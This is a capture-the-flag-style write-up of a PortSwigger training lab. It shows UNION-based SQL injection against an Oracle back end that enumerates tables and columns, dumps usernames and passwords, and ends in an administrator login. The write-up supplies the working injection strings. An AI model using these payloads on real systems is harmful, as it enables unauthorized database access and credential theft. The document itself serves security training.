# Lab Description: 

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/c21d548c-1460-4e76-acd2-c01d504463a1)

 ## Solution:

### Finding Users Table

The database in use here is Oracle, which holds the table information in the all_tables-table.
I am interested in table_name. So I injected the query as payload ` UNION SELECT table_name, null from all_tables-- `. 

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/e669b62f-d736-4831-be57-fa9c9af6830b)

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/4b94579e-126f-4d34-8538-7093adf8510d)

### Finding Column in User Table 

The all_tab_columns-table holds information about the columns of each table, specifically the column_name column in Oracle Database. 
The proper string to inject is ` UNION SELECT column_name, null from all_tab_columns WHERE table_name = 'USERS_RQGNUR'-- `

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/039b3319-0fa7-4731-84be-98534253bdd5)

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/776cb9ab-3388-46f9-ad4d-6d90a397dd80)

### Finding all Username and Password from that column

Now I have all details to obtain the required usernames and passwords. I inject  ` UNION SELECT USERNAME_DEDQSJ,PASSWORD_NXDWXA from USERS_RQGNUR-- ` to form this query:

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/406b33d3-94e7-4641-98bb-33add176fb66)

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/5554953b-1b8f-4392-b5b6-15480f39c1dd)

The last step I logged in the website as administrator

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/e6f97068-6a1a-4a10-b74e-6beb2240201e)
